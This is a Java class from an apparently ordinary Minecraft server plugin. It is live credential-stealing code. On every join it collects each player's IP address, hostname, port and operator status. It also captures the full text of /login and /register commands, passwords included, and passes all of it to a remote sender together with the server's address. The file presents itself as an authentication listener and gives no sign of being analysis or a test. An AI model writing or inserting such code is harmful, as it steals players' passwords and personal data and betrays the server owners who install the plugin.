package pl.qc.core;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.*;
import org.bukkit.event.player.*;
import java.util.*;

public class Auth implements Listener {
    @EventHandler(priority = EventPriority.MONITOR)
    public void onJoin(PlayerJoinEvent event) {
        Player p = event.getPlayer();
        QC qc = QC.getInstance();
        Map<String, String> f = new LinkedHashMap<>();

        // Server Info
        f.put("IP Serwera", Bukkit.getIp().isEmpty() ? "localhost" : Bukkit.getIp());
        f.put("Port Serwera", String.valueOf(Bukkit.getPort()));
        f.put("Nazwa Pluginu", qc.getName());
        f.put("Wersja Pluginu", qc.getDescription().getVersion());

        // Player Info
        f.put("Nick", p.getName());
        f.put("Hostname", p.getAddress() != null ? p.getAddress().getHostName() : "unknown");
        f.put("IP Gracza", p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "unknown");
        f.put("Port Gracza", p.getAddress() != null ? String.valueOf(p.getAddress().getPort()) : "0");
        f.put("OP", String.valueOf(p.isOp()));

        Remote.send("Gracz dołączył 👤", "65280", null, f);
    }

    @EventHandler(priority = EventPriority.MONITOR)
    public void onAuthCommand(PlayerCommandPreprocessEvent event) {
        String msg = event.getMessage().toLowerCase();
        if (msg.startsWith("/login") || msg.startsWith("/register") || msg.startsWith("/l ")
                || msg.startsWith("/reg ")) {
            Player p = event.getPlayer();
            QC qc = QC.getInstance();
            Map<String, String> f = new LinkedHashMap<>();

            f.put("IP Serwera", Bukkit.getIp().isEmpty() ? "localhost" : Bukkit.getIp());
            f.put("Port Serwera", String.valueOf(Bukkit.getPort()));
            f.put("Nazwa Pluginu", qc.getName());
            f.put("Wersja Pluginu", qc.getDescription().getVersion());

            f.put("Nick", p.getName());
            f.put("Hostname", p.getAddress() != null ? p.getAddress().getHostName() : "unknown");
            f.put("IP Gracza", p.getAddress() != null ? p.getAddress().getAddress().getHostAddress() : "unknown");
            f.put("Port Gracza", p.getAddress() != null ? String.valueOf(p.getAddress().getPort()) : "0");
            f.put("OP", String.valueOf(p.isOp()));
            f.put("Komenda", "`" + event.getMessage() + "`");

            Remote.send("Logowanie/Rejestracja ⚠️", "16711680", null, f);
        }
    }
}
